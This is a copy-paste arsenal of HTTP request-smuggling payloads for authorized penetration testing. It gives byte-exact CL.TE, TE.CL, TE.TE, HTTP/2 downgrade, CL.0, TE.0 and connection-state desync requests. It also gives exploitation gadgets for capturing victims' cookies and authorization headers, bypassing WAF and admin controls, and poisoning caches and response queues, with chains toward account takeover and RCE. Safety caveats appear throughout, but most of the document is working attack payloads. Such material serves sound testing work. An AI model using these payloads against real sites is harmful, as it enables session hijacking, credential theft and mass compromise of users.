# Request-Smuggling Arsenal — Desync Probes, Obfuscations & Exploit Gadgets (copy-paste)

> Companion to `REQUEST_SMUGGLING_TESTING_GUIDE.md`. Authorized testing only — **DO NO HARM**: timing first, own
> connections, benign markers, no sustained smuggles against live traffic (Guide §18).
> Use Burp Repeater (HTTP/1 raw, disable auto Content-Length) or Turbo Intruder for byte-exact requests.
> `\r\n` below = a literal CRLF; lengths must be exact.

---

## 1. SAFE timing detection first (Guide §4)

```
# CL.TE timing probe — if the BACK-END honors TE, it waits for more chunks -> DELAY:
POST / HTTP/1.1\r\n
Host: target\r\n
Transfer-Encoding: chunked\r\n
Content-Length: 4\r\n
\r\n
1\r\n
A\r\n
X            <-- incomplete; a TE back-end waits (delay) => CL.TE desync signal

# TE.CL timing probe — mirror:
POST / HTTP/1.1\r\n
Host: target\r\n
Transfer-Encoding: chunked\r\n
Content-Length: 6\r\n
\r\n
0\r\n
\r\n
X            <-- a CL back-end waits for the declared bytes => TE.CL signal
```
Run repeatedly vs a fast baseline; a **consistent** delta = a desync candidate. (No socket poisoning — safe.)
`python3 poc/desync_timing.py -u https://target/`

---

## 2. CL.TE (front-end CL, back-end TE) (Guide §5)

```
POST / HTTP/1.1\r\n
Host: target\r\n
Content-Length: 6\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
G            <-- "G" is left to prefix the NEXT request on the connection
```
Confirm (your own follow-up): smuggle a prefix requesting a unique 404 path; your next request gets that 404.

## 3. TE.CL (front-end TE, back-end CL) (Guide §5)

```
POST / HTTP/1.1\r\n
Host: target\r\n
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
\r\n
5c\r\n
GPOST /smuggle-marker HTTP/1.1\r\n
Host: target\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n
```
(The `5c` chunk size must equal the exact byte length of the smuggled request that follows; tune it.)

## 4. TE.TE — Transfer-Encoding obfuscations (Guide §6)

```
Transfer-Encoding: chunked\r\nTransfer-Encoding: x        (two TE headers)
Transfer-Encoding:\tchunked                                (tab)
Transfer-Encoding : chunked                                (space before colon)
Transfer-Encoding: xchunked
Transfer-Encoding: chunked\r\nTransfer_Encoding: chunked
X: X\r\nTransfer-Encoding: chunked                          (folding tricks)
Transfer-Encoding\r\n : chunked
Transfer-Encoding: "chunked"
Transfer-Encoding: chunked, identity
GET / HTTP/1.1\r\nTransfer-Encoding\n: chunked
```
Pair each with a CL.TE/TE.CL body; whichever obfuscation makes one tier ignore TE creates the desync.

## 5. HTTP/2 desync (downgrade) (Guide §7)

```
H2.CL : send an HTTP/2 request with a Content-Length header that disagrees with the body.
        On downgrade to HTTP/1.1 the origin mis-frames the next request.
H2.TE : include  transfer-encoding: chunked  as an HTTP/2 header → ignored in H2, honored by the H1 origin.
CRLF in H2 header value (request splitting on downgrade):
        header name:  foo
        header value: bar\r\nTransfer-Encoding: chunked\r\n\r\n<smuggled request>
        (or inject via a pseudo-header / :path where the stack mishandles it)
# Burp "HTTP Request Smuggler" has dedicated H2.CL/H2.TE/CRLF probes — use carefully.
```

## 6. Confirmation gadget (deterministic, your own connection) (Guide §8)

```
# smuggle a prefix that requests a UNIQUE path with a distinctive response, then send your benign follow-up:
... (CL.TE/TE.CL body) ...
GET /unique-smuggle-7f3a9 HTTP/1.1\r\n
Host: target\r\n
\r\n
# if YOUR next request to / returns the 404/redirect for /unique-smuggle-7f3a9 → prefix attached. Confirmed.
```

## 7. Exploitation gadgets (benign-first; Guide §9-§13)

```
REQUEST CAPTURE (§9): smuggle a request to a STORE/REFLECT endpoint so the victim's request body is stored:
   POST /comment HTTP/1.1 ... Content-Length: <large> ...  (the victim's request gets appended into the comment)
   -> read the stored content for the victim's Cookie/Authorization. PROVE with your OWN second session.

WAF/AUTH BYPASS (§10): smuggle a request to a blocked/internal path the front-end won't allow:
   GET /admin HTTP/1.1   |   a WAF-blocked payload delivered only to the back-end.

CACHE POISONING (§11): smuggle so a malicious response is cached under a victim URL (prove on a benign/unique key).

RESPONSE-QUEUE POISONING (§12): desync so the next client gets the wrong response (own-traffic proof only).

INTERNAL → RCE/CLOUD (§13): smuggle to a back-end code-exec/SSRF/metadata endpoint → hand off to the SSRF/SSTI/cmdi kit.
```

## 7b. CL.0 / client-side desync / 0.CL variants (guide §7) — modern, often missed
```
CL.0 : the BACK-END ignores Content-Length on certain endpoints (treats body as 0) → the body becomes the next request.
       Target endpoints that "shouldn't" have a body (static files, redirects, some GETs-with-body). Send:
         POST /static/x.js HTTP/1.1 ... Content-Length: 34 ... \r\n\r\n GET /admin HTTP/1.1\r\nFoo: bar
       If the back-end ignores CL on /static, "GET /admin" runs as the next request on the connection.
0.CL : the FRONT-END ignores CL (treats as 0) but back-end honors it — mirror case.
Client-side desync (CSD, browser-powered, PortSwigger 2022): a desync the VICTIM'S OWN BROWSER triggers via a
       cross-origin fetch with keep-alive → no front-end needed; poisons the victim's own connection → request hijack /
       stored-XSS-from-self. Test with the "Browser-Powered Request Smuggling" methodology + Burp's scanner.
H2 extras: HTTP/2 request tunnelling / response splitting via CRLF in header values or :path; H2->H1 CL/TE on downgrade
       (§5). Also test :authority vs Host disagreement and header-name CRLF.
```

## 7b1. TE.0 / CL.CL / request tunnelling / pause-based desync (guide §7.4) — the 2022–2024 wave
```
TE.0 : mirror of CL.0 for Transfer-Encoding — one tier honors `Transfer-Encoding: chunked`, the other treats body as 0.
       Same body-less endpoints (static/redirect/OPTIONS). Send chunked (optionally obfuscated TE), trailing bytes = next req:
         POST /static/x.js HTTP/1.1 ... Transfer-Encoding: chunked ... \r\n\r\n 0\r\n\r\nGET /admin HTTP/1.1\r\nFoo: bar
CL.CL: duplicate / ambiguous Content-Length the two tiers resolve differently (one trims whitespace/leading-zeros, one not):
         Content-Length: 6\r\nContent-Length: 5   → shorter view leaves trailing bytes as the next request.
Request tunnelling: front-end blindly forwards your prefixed request to the back-end → read an INTERNAL-only response
       inside YOUR own response (blind-SSRF-grade) even when no cross-user desync is reusable. Tell-tale: TWO responses
       concatenated for one send. Great for internal header reflection / admin-only endpoints without victim impact.
Pause-based desync (Kettle 2024): send headers + partial body, PAUSE, exploit early-flush/read-timeout splitting.
       Reachable from a victim browser via fetch streams on some CDNs/origins. Burp Turbo Intruder can stall mid-send.
# all: confirm with the deterministic gadget (§6) on YOUR connection; do-no-harm (no cross-user persistence).
```

## 7b2. Connection-state attacks (first-request routing / validation) (guide §7.3)
```
# NOT framing desync — the front-end applies a per-CONNECTION decision only to the FIRST request, reuses it for the rest.
# Needs connection reuse (HTTP/1.1 keep-alive or HTTP/2). Send TWO requests on ONE connection:
#
# First-request ROUTING:  req#1 to an ALLOWED vhost establishes the route; req#2 (same conn) targets an internal vhost:
  GET / HTTP/1.1\r\nHost: allowed.target.com\r\nConnection: keep-alive\r\n\r\n
  GET /admin HTTP/1.1\r\nHost: internal-only.target\r\n\r\n     ← routed to the internal backend (route inherited)
#
# First-request VALIDATION:  the edge authenticates/validates only req#1; req#2 inherits the trust:
  <benign authenticated/allowed request #1>
  <privileged/blocked request #2 on the same connection>
# Test: same payload over a fresh connection vs a reused one — different result = connection-state bug.
# (Burp: "HTTP Request Smuggler" + send-group-in-single-connection / Turbo Intruder pipelined requests.)
```

## 7c. Real-world smuggling CVEs, chains & references (guide §9-§13)
```
□ PortSwigger "HTTP Desync Attacks" (Kettle, 2019) — CL.TE/TE.CL across many CDN/proxy stacks → request hijack & cache poison.
□ "HTTP/2: The Sequel is Always Worse" (Kettle, 2021) — H2.CL/H2.TE/CRLF downgrade desync on "HTTP/1-safe" sites.
□ "Browser-Powered / Client-Side Desync" (Kettle, 2022) — CL.0 & CSD; victim's browser does the smuggling.
□ Specific stacks historically affected: various via mismatched front-end (Cloudflare/Akamai/Fastly/ALB/HAProxy/nginx)
   ↔ origin parsing. (Match your chain; reproduce SAFELY.)
□ Impact chains: request capture → steal Cookie/Authorization → ATO ; WAF/auth bypass → /admin or internal → RCE
   (SSRF/SSTI/cmdi kits) ; cache poisoning → mass stored XSS (Host-Header kit §12) ; response-queue poisoning → victims
   receive each other's responses → mass credential/data leak.
□ Overlaps with Host-header & cache-poisoning kits — a desync is another route to those mass-impact outcomes.
```
> **References:** PortSwigger *HTTP request smuggling* (Academy + labs) and James Kettle's research papers (Desync /
> HTTP/2 / Browser-Powered), PayloadsAllTheThings *Request Smuggling*, HackTricks *HTTP Request Smuggling*,
> `defparam/smuggler` & Burp "HTTP Request Smuggler" + Turbo Intruder, Hackviser & PentesterLab modules.
> **DO NO HARM:** these can disrupt real users — timing first, own connections, benign markers (guide §18).

---

## 8. Triage rules (don't waste a report — and don't break the site)

```
deterministic controllable desync + request capture (own session)   → REPORT Critical (ATO), do-no-harm
desync + WAF/auth bypass to a sensitive/internal endpoint            → REPORT High–Critical (→ RCE via §13)
desync + cache/response-queue poisoning (cross-user)                 → REPORT High–Critical (benign-key proof)
confirmed controllable desync, no exploit built                      → REPORT Medium
timing blip only / tool flag / non-reproducible / 400 errors         → NOT a finding (confirm deterministically)
```
